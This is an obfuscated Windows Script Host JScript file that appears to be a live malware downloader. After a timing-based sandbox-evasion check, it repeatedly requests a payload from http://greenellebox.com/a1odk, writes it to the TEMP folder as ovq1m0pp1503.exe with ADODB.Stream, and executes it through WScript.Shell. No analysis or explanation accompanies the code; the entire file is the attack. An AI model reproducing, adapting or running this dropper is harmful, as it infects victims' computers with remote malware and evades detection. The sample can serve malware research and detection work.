var cV = false;
var q = "CreateObject";
var Bg = function o() {return WScript[q]("WScript.Shell");}(), H = 11;
var HC = "MSXML2.XMLHTTP";
var cl = 2123213;
var UT = 0;
function d(TO){Bg["Run"](TO, UT, UT);};
function Xe(){return "" + HC;};
function If(p, PD){UT = UT * 1; return p - PD;};
function gr(){return q;};
/*@cc_on
  @if (@_win32 || @_win64)
    cV = true;
  @end
@*/
if (cV)
{
var pZ = "";
function Rg(){return 22;};
var c = 0; var GU = 0;
function qB()
{
var eH = new this["Date"]();
var VA = eH["getUTCMilliseconds"]();
WScript["Sleep"](Rg());
var eH = new this["Date"]();
var sA = eH["getUTCMilliseconds"]();
WScript["Sleep"](Rg());
var eH = new this["Date"]();
var j = eH["getUTCMilliseconds"]();
var c = "k";
c = If(sA, VA);
var GU = "v";
GU = If(j, sA);
pZ = "open";
return If(c, GU);
}
var HR = false;
var W = false;
for (var T = UT; T < Rg() * 1; T++){if (qB() != UT){
HR = true; 
GU = "31" + 11 * c + GU; 
W = true; 
break;
}}
function mK() {return ((HR == true) && (HR == W)) ? 1 : UT;};
if (HR && mK() && W){
function Fm() {return Bg["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ovq1m0pp1503.exe";};
 ec = Xe();
 ny = WScript[q](ec);
 var yi = 1;
 while (yi){
try {
ny[pZ]("GET", "http://greenellebox.com/a1odk", false);
ny["send"]();
Mt = "Sleep";
for (;;){WScript[Mt](Rg() * 11); if (ny["readystate"] >= 2 * 2) break;};
yi = UT;
} catch(d0){};
}
function g(r) {var pl = (1, 2, 3, 4, 5, r); return pl;};
WF = WScript[gr()]("ADODB.Stream");
ec = WF;
ec[pZ]();
ec["type"] = g(1);
ec["write"](ny["ResponseBody"]);
WF["position"] = g(UT);
ec["Save" + "ToFile"](Fm(), 2);
WF["c"+"lose"]();
qB0 = Fm();
d(qB0);
}
}

